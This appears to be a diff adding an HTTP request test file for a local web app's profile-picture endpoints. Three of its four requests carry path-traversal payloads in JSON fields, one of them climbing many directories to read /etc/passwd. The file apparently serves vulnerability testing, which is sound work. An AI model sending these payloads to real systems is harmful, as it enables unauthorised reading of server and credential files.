@@ -1,0 +1,33 @@
+GET http://127.0.0.1:5000/profile_picture
+Content-Type: application/json
+
+{
+    "picture_name": "user001.png"
+}
+
+###
+
+GET http://127.0.0.1:5000/profile_picture
+Content-Type: application/json
+
+{
+    "picture_name": "../pictures/test.txt"
+}
+
+###
+
+GET http://127.0.0.1:5000/get_picture
+Content-Type: application/json
+
+{
+    "picture_name": "../src/*.*"
+}
+
+###
+
+GET http://127.0.0.1:5000/get_picture
+Content-Type: application/json
+
+{
+    "user": "../../../../../../../../../../../../../../../../../etc/passwd"
+}
